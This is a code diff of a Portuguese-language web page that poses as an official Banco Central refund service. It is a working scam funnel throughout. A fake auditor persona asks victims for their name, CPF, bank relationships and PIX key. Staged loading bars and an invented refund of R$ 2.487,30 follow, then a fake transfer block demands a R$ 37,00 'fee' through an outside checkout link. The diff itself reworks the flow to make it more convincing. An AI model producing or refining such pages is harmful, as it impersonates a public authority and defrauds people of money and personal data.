@@ -6,92 +6,94 @@
     <title>Sistema Oficial de Restituição - Banco Central</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        /* Força o carregamento no topo */
         html { scroll-behavior: smooth; }
-        body { font-family: 'Roboto', sans-serif; background-color: #f5f7fa; margin: 0; padding: 0; }
+        body { font-family: 'Roboto', sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; color: #333; }
         
-        .header-gov { background: #003399; color: white; padding: 15px; text-align: center; font-weight: 900; font-size: 14px; position: sticky; top: 0; z-index: 1000; text-transform: uppercase; border-bottom: 3px solid #ffcc00; }
-        .container { max-width: 500px; margin: 0 auto; background: white; min-height: 100vh; padding: 20px; display: flex; flex-direction: column; }
+        .header-gov { background: #003399; color: white; padding: 15px; text-align: center; font-weight: 900; font-size: 13px; position: sticky; top: 0; z-index: 1000; text-transform: uppercase; border-bottom: 3px solid #ffcc00; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .container { max-width: 500px; margin: 0 auto; background: white; min-height: 100vh; padding: 20px; display: flex; flex-direction: column; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
         
-        .msg { margin-bottom: 20px; padding: 18px; border-radius: 15px; font-size: 16px; line-height: 1.6; display: none; animation: fadeIn 0.4s ease; border: 1px solid #e0e6ed; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .msg { margin-bottom: 18px; padding: 15px; border-radius: 12px; font-size: 15px; line-height: 1.5; display: none; animation: fadeIn 0.3s ease; position: relative; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
         
-        .auditor { background: #f8f9fb; align-self: flex-start; color: #2c3e50; border-left: 5px solid #003399; }
-        .perfil { display: flex; align-items: center; margin-bottom: 10px; }
-        .perfil img { width: 45px; height: 45px; border-radius: 50%; margin-right: 12px; border: 2px solid #003399; }
-        .perfil-info b { font-size: 14px; color: #003399; display: block; }
-        .perfil-info span { font-size: 11px; color: #7f8c8d; text-transform: uppercase; }
+        .auditor { background: #f8f9fb; align-self: flex-start; color: #2c3e50; border-left: 4px solid #003399; border-bottom: 1px solid #e0e0e0; }
+        .perfil { display: flex; align-items: center; margin-bottom: 8px; }
+        .perfil img { width: 40px; height: 40px; border-radius: 50%; margin-right: 10px; border: 2px solid #003399; }
+        .perfil-info b { font-size: 13px; color: #003399; display: block; }
+        .perfil-info span { font-size: 10px; color: #7f8c8d; text-transform: uppercase; }
 
-        .input-area { display: none; margin: 10px 0 25px 0; }
-        .field { width: 100%; padding: 18px; border: 2px solid #ced4da; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; }
-        .field:focus { border-color: #003399; }
+        .input-area { display: none; margin: 5px 0 20px 0; animation: fadeIn 0.5s; }
+        .field { width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; transition: 0.3s; }
+        .field:focus { border-color: #003399; outline: none; }
         
-        .btn-next { background: #27ae60; color: white; border: none; padding: 20px; width: 100%; border-radius: 8px; font-weight: 900; font-size: 17px; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
+        .btn-next { background: #27ae60; color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-weight: 900; font-size: 16px; cursor: pointer; margin-top: 10px; text-transform: uppercase; transition: 0.2s; }
+        .btn-next:active { transform: scale(0.98); }
         
-        .bank-option { background: #fff; border: 2px solid #ebedef; padding: 15px; margin-bottom: 8px; border-radius: 8px; width: 100%; text-align: left; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: space-between; }
-        .bank-option.selected { border-color: #003399; background: #eef2f7; }
-        .bank-option i { color: #bdc3c7; }
-        .bank-option.selected i { color: #003399; }
+        .bank-option { background: #fff; border: 2px solid #e0e0e0; padding: 14px; margin-bottom: 8px; border-radius: 8px; width: 100%; text-align: left; font-weight: bold; cursor: pointer; display: flex; justify-content: space-between; transition: 0.2s; }
+        .bank-option.selected { border-color: #003399; background: #eef2f7; color: #003399; }
 
-        .loading-bar-container { display: none; width: 100%; background: #eee; height: 12px; border-radius: 10px; margin: 20px 0; overflow: hidden; }
-        .loading-bar { width: 0%; height: 100%; background: #27ae60; transition: width 0.1s; }
+        .loading-bar-container { display: none; width: 100%; background: #eee; height: 14px; border-radius: 10px; margin: 20px 0; overflow: hidden; border: 1px solid #ddd; }
+        .loading-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #27ae60, #2ecc71); transition: width 0.1s; }
 
-        .resumo-box { display: none; background: #fff; border: 2px solid #003399; padding: 20px; border-radius: 10px; margin: 20px 0; font-size: 14px; }
-        .resumo-item { margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        .resumo-box { display: none; background: #fff; border: 2px solid #003399; padding: 15px; border-radius: 10px; margin: 15px 0; font-size: 13px; }
+        .resumo-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #f0f0f0; }
+        .val-destaque { color: #27ae60; font-weight: 900; font-size: 16px; }
         
-        .error-plate { display: none; background: #fff5f5; border: 2px solid #feb2b2; color: #c53030; padding: 20px; border-radius: 10px; text-align: center; font-weight: bold; margin: 20px 0; }
-        
-        .checkout-btn { background: #003399; color: white; text-decoration: none; padding: 22px; border-radius: 10px; font-weight: 900; display: block; text-align: center; font-size: 18px; margin-top: 15px; }
+        .checkout-btn { background: #003399; color: white; text-decoration: none; padding: 20px; border-radius: 10px; font-weight: 900; display: block; text-align: center; font-size: 17px; margin-top: 15px; box-shadow: 0 4px 15px rgba(0,51,153,0.3); }
+
+        /* Estilo Slider */
+        .slider-container { padding: 10px 0; }
+        .slider { width: 100%; height: 10px; border-radius: 5px; background: #d3d3d3; outline: none; -webkit-appearance: none; }
+        .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 25px; height: 25px; border-radius: 50%; background: #003399; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="header-gov">🏛️ Sistema de Devolução de Tarifas Bancárias - BC</div>
+    <div class="header-gov">🏛️ PROTOCOLO UNIFICADO DE RESTITUIÇÃO FINANCEIRA</div>
 
     <div class="container" id="chat">
         
         <div id="m1" class="msg auditor">
             <div class="perfil">
                 <img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png">
-                <div class="perfil-info"><b>Roberto Silva</b><span>Auditor Financeiro - Banco Central</span></div>
+                <div class="perfil-info"><b>Roberto Silva</b><span>Auditor Sênior - Banco Central</span></div>
             </div>
-            Olá. Sou o <b>Roberto Silva</b>, Auditor Financeiro. Este canal é destinado à consulta e recebimento de valores cobrados indevidamente por instituições bancárias nos últimos 10 anos.
-        </div>
-        <div id="m2" class="msg auditor">
-            O processo é garantido por lei e independe da idade do titular. Vamos iniciar sua consulta agora? Por favor, digite seu <b>nome completo</b>:
-        </div>
-        <div id="i1" class="input-area" style="display:block;">
-            <input type="text" id="nome-in" class="field" placeholder="Nome Completo">
-            <button class="btn-next" onclick="step(1)">Iniciar Consulta</button>
+            Iniciando atendimento via canal seguro. Sou o auditor Roberto e vou validar seu saldo acumulado de tarifas bancárias e juros contratuais dos últimos 10 anos.
         </div>
 
-        <div id="m3" class="msg auditor">
-            Certo, <span class="u-nome"></span>. Agora, informe o seu <b>CPF</b> para identificarmos os registros vinculados:
+        <div id="m2" class="msg auditor">Para começar a consulta na base de dados do SRV (Sistema de Valores a Receber), informe seu <b>nome completo</b>:</div>
+        <div id="i1" class="input-area" style="display:block;">
+            <input type="text" id="nome-in" class="field" placeholder="Digite seu nome...">
+            <button class="btn-next" onclick="step(1)">Avançar</button>
         </div>
+
+        <div id="m3" class="msg auditor">Identificado. Agora, <span class="u-nome"></span>, informe o <b>CPF</b> do titular para cruzamento de dados na Receita e BACEN:</div>
         <div id="i2" class="input-area">
             <input type="tel" id="cpf-in" class="field" placeholder="000.000.000-00">
-            <button class="btn-next" onclick="step(2)">Confirmar CPF</button>
+            <button class="btn-next" onclick="step(2)">Consultar CPF</button>
         </div>
 
-        <div id="m4" class="msg auditor">
-            Para finalizar a identificação, informe seu <b>número de telefone/WhatsApp</b> com DDD. É por ele que enviaremos o protocolo oficial e o comprovante de transferência:
-        </div>
+        <div id="m4" class="msg auditor">Sua conta bancária principal está <b>ativa há mais de 3 anos</b> e você utiliza o <b>aplicativo do banco</b> com frequência?</div>
         <div id="i3" class="input-area">
-            <input type="tel" id="zap-in" class="field" placeholder="(00) 00000-0000">
-            <button class="btn-next" onclick="step(3)">Validar Dados</button>
+            <button class="bank-option" onclick="step(3)">Sim, conta ativa e uso App</button>
+            <button class="bank-option" onclick="step(3)">Não utilizo aplicativo</button>
         </div>
 
-        <div id="m5" class="msg auditor">
-            Você possui conta bancária ativa ou realizou empréstimos/financiamentos há mais de 3 anos?
-        </div>
+        <div id="m5" class="msg auditor">Você realizou algum <b>Empréstimo, Financiamento de Veículo ou Imobiliário</b> nos últimos 10 anos?</div>
         <div id="i4" class="input-area">
-            <button class="bank-option" onclick="step(4)">Sim, possuo registros antigos</button>
-            <button class="bank-option" onclick="step(4)">Não tenho certeza</button>
+            <button class="bank-option" onclick="showFinanc()">Sim, realizei</button>
+            <button class="bank-option" onclick="step(4)">Não/Não me lembro</button>
         </div>
 
-        <div id="m6" class="msg auditor">
-            Selecione abaixo os <b>bancos</b> que você utiliza ou já utilizou (pode marcar mais de um):
+        <div id="m5-1" class="msg auditor">Qual foi o valor aproximado do contrato? (Isso define o cálculo de juros abusivos a restituir):</div>
+        <div id="i4-1" class="input-area">
+            <div class="slider-container">
+                <input type="range" min="1000" max="100000" value="15000" class="slider" id="financRange" oninput="updateRange(this.value)">
+                <p style="text-align:center; font-weight:bold; color:#003399;">R$ <span id="rangeVal">15.000</span></p>
+            </div>
+            <button class="btn-next" onclick="step(4)">Confirmar Valor</button>
         </div>
+
+        <div id="m6" class="msg auditor">Selecione as instituições onde você possui ou possuiu vínculo (isso agrupa os lotes de devolução):</div>
         <div id="i5" class="input-area">
             <div class="bank-option" onclick="toggleBank(this, 'Itaú')">Itaú <span>+</span></div>
             <div class="bank-option" onclick="toggleBank(this, 'Bradesco')">Bradesco <span>+</span></div>
@@ -99,103 +101,85 @@
             <div class="bank-option" onclick="toggleBank(this, 'BB')">Banco do Brasil <span>+</span></div>
             <div class="bank-option" onclick="toggleBank(this, 'Santander')">Santander <span>+</span></div>
             <div class="bank-option" onclick="toggleBank(this, 'Nubank')">Nubank <span>+</span></div>
-            <button class="btn-next" onclick="step(5)">Confirmar Bancos</button>
+            <button class="btn-next" onclick="processConsult()">Localizar Saldo</button>
         </div>
 
-        <div id="m7" class="msg auditor">
-            Consulta finalizada. Identificamos um montante de <b>R$ 2.487,30</b> referente a tarifas administrativas e juros abusivos acumulados.
-        </div>
-        <div id="m8" class="msg auditor">
-            Como você deseja receber este valor agora?
-        </div>
-        <div id="i6" class="input-area">
-            <button class="bank-option" onclick="showPixField()">Receber via PIX (Imediato)</button>
-            <button class="bank-option" onclick="showPixField()">Transferência TED (24 horas)</button>
-        </div>
-
-        <div id="i-pix" class="input-area">
-            <input type="text" id="pix-in" class="field" placeholder="Digite sua Chave PIX">
-            <button class="btn-next" onclick="step(6)">Confirmar Chave e Sacar</button>
-        </div>
-
-        <div id="m9" class="msg auditor">
-            Confirme os dados da ordem de pagamento:
-        </div>
-        <div id="resumo" class="resumo-box">
-            <div class="resumo-item"><b>Titular:</b> <span id="r-nome"></span></div>
-            <div class="resumo-item"><b>CPF:</b> <span id="r-cpf"></span></div>
-            <div class="resumo-item"><b>Telefone:</b> <span id="r-tel"></span></div>
-            <div class="resumo-item"><b>Chave PIX:</b> <span id="r-pix"></span></div>
-            <div class="resumo-item"><b>Bancos:</b> <span id="r-bancos"></span></div>
-            <div style="font-size: 18px; color: #27ae60; font-weight: 900; text-align: center; margin-top: 10px;">TOTAL: R$ 2.487,30</div>
-        </div>
-        <div id="m10" class="msg auditor">
-            Esta operação é limitada a <b>um saque por CPF</b> e não interfere em nenhum benefício social ou aposentadoria. Você concorda com os termos?
-        </div>
-        <div id="i7" class="input-area">
-            <button class="btn-next" onclick="startTransfer()">OK, CONCORDO E DESEJO RECEBER</button>
-        </div>
-
-        <div id="loading-area" style="display:none; text-align:center;">
-            <p id="loading-text" style="font-weight:bold; color:#003399;">Iniciando transferência via PIX...</p>
+        <div id="loading-area" style="display:none; text-align:center; padding: 20px 0;">
+            <p id="loading-text" style="font-weight:bold; color:#003399;">Acessando servidores do BACEN...</p>
             <div class="loading-bar-container" style="display:block;"><div class="loading-bar" id="bar"></div></div>
         </div>
 
-        <div id="error-box" class="error-plate">
-            ⚠️ TRANSFERÊNCIA NÃO CONSTATADA NO SISTEMA
+        <div id="m7" class="msg auditor"><b>CONSULTA CONCLUÍDA COM SUCESSO!</b><br><br>Localizamos registros de taxas administrativas indevidas e seguros não contratados vinculados ao seu CPF.</div>
+        
+        <div id="resumo-valores" class="resumo-box">
+            <div style="text-align:center; font-weight:bold; margin-bottom:10px; color:#003399;">DETALHAMENTO DO LOTE</div>
+            <div id="split-bancos"></div>
+            <div class="resumo-item" style="border-top:2px solid #eee; margin-top:10px;">
+                <b>VALOR TOTAL:</b> <span class="val-destaque">R$ 2.487,30</span>
+            </div>
+        </div>
+
+        <div id="m8" class="msg auditor">Como deseja receber o montante agora?</div>
+        <div id="i6" class="input-area">
+            <button class="bank-option" onclick="showPixField()">Receber via PIX (Imediato)</button>
+            <button class="bank-option" onclick="showPixField()">Transferência TED (Até 24h)</button>
+        </div>
+
+        <div id="i-pix" class="input-area">
+            <input type="text" id="pix-in" class="field" placeholder="Sua chave PIX aqui...">
+            <button class="btn-next" onclick="step(6)">Confirmar e Solicitar Saque</button>
+        </div>
+
+        <div id="m10" class="msg auditor"><b>TERMOS DE ACEITE:</b><br>Ao clicar abaixo, você concorda com a liquidação do lote e emissão da guia de transporte eletrônica. O saque é único e irrevogável.</div>
+        <div id="i7" class="input-area">
+            <button class="btn-next" onclick="startTransfer()">ESTOU DE ACORDO, QUERO RECEBER</button>
+        </div>
+
+        <div id="error-box" style="display:none; background:#fff5f5; border:2px solid #feb2b2; color:#c53030; padding:20px; border-radius:10px; text-align:center; font-weight:bold; margin:20px 0;">
+            ⚠️ BLOQUEIO DE TRANSFERÊNCIA DETECTADO
         </div>
 
         <div id="m11" class="msg auditor">
             <div class="perfil">
                 <img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png">
-                <div class="perfil-info"><b>Roberto Silva</b><span>Auditor Financeiro - Banco Central</span></div>
+                <div class="perfil-info"><b>Roberto Silva</b><span>Auditor Sênior - Banco Central</span></div>
             </div>
-            Ocorreu um erro na emissão do lote. A <b>Taxa de Emissão da Nota Fiscal Eletrônica</b> não foi identificada no sistema para o seu CPF.
+            O sistema tentou realizar o envio de <b>R$ 2.487,30</b> para sua chave, porém a <b>Tarifa de Emissão de Nota Fiscal Eletrônica (e-NF)</b> não consta como paga no sistema.
         </div>
-        <div id="m12" class="msg auditor" style="background:#fff3cd; border-color:#ffeeba;">
-            Para liberar o envio imediato, é necessário o pagamento da taxa de <b>R$ 37,00</b>. <br><br>
-            <b>NOTA:</b> Este valor de R$ 37,00 será <b>ESTORNADO AUTOMATICAMENTE</b> junto com o seu saldo total após a compensação da nota. <br><br>
-            <b>VALOR TOTAL A RECEBER: R$ 2.524,30</b>
-            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="checkout-btn">EMITIR NOTA E RECEBER R$ 2.524,30</a>
+
+        <div id="m12" class="msg auditor" style="background:#fff3cd; border:1px solid #ffeeba;">
+            Para desbloquear o saldo total + o reembolso da tarifa, realize o pagamento da guia de <b>R$ 37,00</b> agora. <br><br>
+            <b>VALOR TOTAL DISPONÍVEL: R$ 2.524,30</b>
+            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="checkout-btn">PAGAR TARIFA E RECEBER TUDO AGORA</a>
         </div>
 
     </div>
 
     <script>
-        let userData = { nome: "", cpf: "", tel: "", pix: "", bancos: [] };
+        let userData = { nome: "", cpf: "", bancos: [] };
 
         function show(id) { document.getElementById(id).style.display = 'block'; window.scrollTo(0, document.body.scrollHeight); }
         function hide(id) { document.getElementById(id).style.display = 'none'; }
+
+        function updateRange(val) { document.getElementById('rangeVal').innerText = parseInt(val).toLocaleString('pt-BR'); }
 
         function step(n) {
             if (n === 1) {
                 userData.nome = document.getElementById('nome-in').value;
                 if (userData.nome.length < 5) return;
                 document.querySelectorAll('.u-nome').forEach(el => el.innerText = userData.nome.split(' ')[0]);
-                hide('i1'); show('m3'); setTimeout(() => show('i2'), 1000);
+                hide('i1'); show('m3'); setTimeout(() => show('i2'), 800);
             } else if (n === 2) {
-                userData.cpf = document.getElementById('cpf-in').value;
-                if (userData.cpf.length < 11) return;
-                hide('i2'); show('m4'); setTimeout(() => show('i3'), 1000);
+                if (document.getElementById('cpf-in').value.length < 11) return;
+                hide('i2'); show('m4'); setTimeout(() => show('i3'), 800);
             } else if (n === 3) {
-                userData.tel = document.getElementById('zap-in').value;
-                hide('i3'); show('m5'); setTimeout(() => show('i4'), 1000);
+                hide('i3'); show('m5'); setTimeout(() => show('i4'), 800);
             } else if (n === 4) {
-                hide('i4'); show('m6'); setTimeout(() => show('i5'), 1000);
-            } else if (n === 5) {
-                if (userData.bancos.length === 0) return;
-                hide('i5'); show('m7'); setTimeout(() => show('m8'), 1500); setTimeout(() => show('i6'), 2000);
-            } else if (n === 6) {
-                userData.pix = document.getElementById('pix-in').value;
-                document.getElementById('r-nome').innerText = userData.nome;
-                document.getElementById('r-cpf').innerText = userData.cpf;
-                document.getElementById('r-tel').innerText = userData.tel;
-                document.getElementById('r-pix').innerText = userData.pix;
-                document.getElementById('r-bancos').innerText = userData.bancos.join(', ');
-                hide('i-pix'); show('m9'); setTimeout(() => show('resumo'), 1000);
-                setTimeout(() => show('m10'), 2500); setTimeout(() => show('i7'), 3000);
+                hide('i4'); hide('i4-1'); show('m6'); setTimeout(() => show('i5'), 800);
             }
         }
+
+        function showFinanc() { hide('i4'); show('m5-1'); show('i4-1'); }
 
         function toggleBank(el, name) {
             el.classList.toggle('selected');
@@ -206,34 +190,88 @@
             }
         }
 
-        function showPixField() { hide('i6'); show('i-pix'); }
-
-        function startTransfer() {
-            hide('i7'); show('loading-area');
+        function processConsult() {
+            if (userData.bancos.length === 0) return;
+            hide('i5');
+            show('loading-area');
             let bar = document.getElementById('bar');
             let width = 0;
             let interval = setInterval(() => {
-                if (width >= 90) {
+                width += 0.4;
+                bar.style.width = width + '%';
+                if (width > 30) document.getElementById('loading-text').innerText = "Cruzando dados com o sistema interbancário...";
+                if (width > 60) document.getElementById('loading-text').innerText = "Calculando juros compostos e taxas de 10 anos...";
+                if (width > 85) document.getElementById('loading-text').innerText = "Gerando protocolo de restituição...";
+                
+                if (width >= 100) {
                     clearInterval(interval);
-                    setTimeout(() => {
-                        hide('loading-area');
-                        show('error-box');
-                        setTimeout(() => show('m11'), 1500);
-                        setTimeout(() => show('m12'), 3500);
-                    }, 2000);
-                } else {
-                    width += 0.5;
-                    bar.style.width = width + '%';
-                    if (width > 40) document.getElementById('loading-text').innerText = "Processando lote administrativo...";
-                    if (width > 70) document.getElementById('loading-text').innerText = "Aguardando confirmação de nota fiscal...";
+                    renderResumo();
+                }
+            }, 40);
+        }
+
+        function renderResumo() {
+            hide('loading-area');
+            let splitDiv = document.getElementById('split-bancos');
+            let total = 2487.30;
+            let part = (total / userData.bancos.length).toFixed(2);
+            
+            splitDiv.innerHTML = "";
+            userData.bancos.forEach(b => {
+                splitDiv.innerHTML += `<div class="resumo-item"><span>Tarifas ${b}:</span> <b>R$ ${parseFloat(part).toLocaleString('pt-BR')}</b></div>`;
+            });
+
+            show('m7'); setTimeout(() => show('resumo-valores'), 1000);
+            setTimeout(() => show('m8'), 2500);
+            setTimeout(() => show('i6'), 3000);
+        }
+
+        function showPixField() { hide('i6'); show('i-pix'); }
+
+        function step(n) {
+            // Reaproveitando para o fluxo final
+            if (n === 6) {
+                hide('i-pix'); show('m10'); setTimeout(() => show('i7'), 800);
+            } else {
+                // Código das outras steps...
+                if (n === 1) {
+                    userData.nome = document.getElementById('nome-in').value;
+                    if (userData.nome.length < 5) return;
+                    document.querySelectorAll('.u-nome').forEach(el => el.innerText = userData.nome.split(' ')[0]);
+                    hide('i1'); show('m3'); setTimeout(() => show('i2'), 800);
+                } else if (n === 2) {
+                    hide('i2'); show('m4'); setTimeout(() => show('i3'), 800);
+                } else if (n === 3) {
+                    hide('i3'); show('m5'); setTimeout(() => show('i4'), 800);
+                } else if (n === 4) {
+                    hide('i4'); hide('i4-1'); show('m6'); setTimeout(() => show('i5'), 800);
+                }
+            }
+        }
+
+        function startTransfer() {
+            hide('i7');
+            show('loading-area');
+            document.getElementById('loading-text').innerText = "Enviando PIX para processamento...";
+            let bar = document.getElementById('bar');
+            bar.style.width = '0%';
+            let width = 0;
+            let interval = setInterval(() => {
+                width += 1.5;
+                bar.style.width = width + '%';
+                if (width >= 100) {
+                    clearInterval(interval);
+                    hide('loading-area');
+                    show('error-box');
+                    setTimeout(() => show('m11'), 1200);
+                    setTimeout(() => show('m12'), 3000);
                 }
             }, 50);
         }
 
         window.onload = () => {
-            window.scrollTo(0,0);
             setTimeout(() => show('m1'), 500);
-            setTimeout(() => show('m2'), 2500);
+            setTimeout(() => show('m2'), 2000);
         };
     </script>
 </body>
